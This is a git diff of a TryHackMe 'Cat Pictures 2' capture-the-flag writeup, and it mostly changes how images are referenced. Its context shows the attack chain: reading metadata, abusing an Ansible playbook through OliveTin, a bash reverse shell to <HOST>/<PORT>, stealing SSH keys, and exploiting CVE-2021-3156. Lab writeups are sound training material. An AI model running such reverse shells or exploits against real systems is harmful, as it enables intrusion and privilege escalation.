@@ -2,16 +2,16 @@
 
 A writeup for the room [Cat Pictures 2](https://tryhackme.com/room/catpictures2) on TryHackMe.
 
+> Now with more Cat Pictures!
+
+<Image src="https://tryhackme-images.s3.amazonaws.com/room-icons/4c424fa649d64938ae8282b14e4299ac.png" width="256" />
+
 Main parts of the room:
 
 - Reading image metadata
 - Accessing Gitea and editing files using Git or in-browser editor
 - Runnig custom Ansible tasks through OliveTin
 - Exploiting CVE-2021-3156
-
-> Now with more Cat Pictures!
-
-<Image src="https://tryhackme-images.s3.amazonaws.com/room-icons/4c424fa649d64938ae8282b14e4299ac.png" width="128" />
 
 ## Footprinting
 
@@ -23,7 +23,7 @@ We find five open ports with three web servers publicly accessible.
 nmap -sS <HOST>
 ```
 
-<Image src="/images/writeups/thm/2023/cat-pictures-2/nmap.png" />
+<Image src={require("./nmap.png").default} />
 
 ```
 22 -> SSH
@@ -41,7 +41,7 @@ We can begin by looking inside the Lychee Photo Album.
 
 In the info of the first image we can find a message about stripping away the metadata.
 
-<Image src="/images/writeups/thm/2023/cat-pictures-2/image.png" />
+<Image src={require("./image.png").default} />
 
 Once the image is downloaded, we can check its metadata to find an url to a secret txt note.
 
@@ -49,7 +49,7 @@ Once the image is downloaded, we can check its metadata to find an url to a secr
 exiftool image.jpg
 ```
 
-<Image src="/images/writeups/thm/2023/cat-pictures-2/metadata.png" />
+<Image src={require("./metadata.png").default} />
 
 ### The secret note
 
@@ -74,7 +74,7 @@ Now, we have the credentials for the Gitea instance.
 
 Once logged in, we can see a repository called `ansible`.
 
-<Image src="/images/writeups/thm/2023/cat-pictures-2/repo.png" />
+<Image src={require("./repo.png").default} />
 
 Inside the repository there is a file called `flag1.txt`. Open it to get the first flag.
 
@@ -86,7 +86,7 @@ From the secret note, we know that Ansible is accessible on the port 1337.
 
 There we can find a OliveTin instance that allows to run the Ansible tasks.
 
-<Image src="/images/writeups/thm/2023/cat-pictures-2/ansible.png" />
+<Image src={require("./ansible.png").default} />
 
 ### Editing the playbook
 
@@ -94,7 +94,7 @@ It is possible to change the script `playbook.yml` through Gitea and then run it
 
 If you prefer you can also configure the ssh access and modify it from your machine.
 
-<Image src="/images/writeups/thm/2023/cat-pictures-2/edit.png" />
+<Image src={require("./edit.png").default} />
 
 Firstly, we can print the content of the home folder.
 
@@ -136,7 +136,7 @@ We can edit again the script to print the content of the flag.
     - debug: var=flag2
 ```
 
-<Image src="/images/writeups/thm/2023/cat-pictures-2/ansible-output.png" />
+<Image src={require("./ansible-output.png").default} />
 
 If you check the output, you can see the second flag.
 
@@ -172,7 +172,7 @@ In this Gist you can find an example:
       shell: bash -c 'bash -i >& /dev/tcp/<HOST>/<PORT> 0>&1'
 ```
 
-<Image src="/images/writeups/thm/2023/cat-pictures-2/rev.png" />
+<Image src={require("./rev.png").default} />
 
 ### Stealing ssh keys
 
@@ -207,4 +207,4 @@ make
 
 The third flag is in the root folder.
 
-<Image src="/images/writeups/thm/2023/cat-pictures-2/pe.png" />
+<Image src={require("./pe.png").default} />
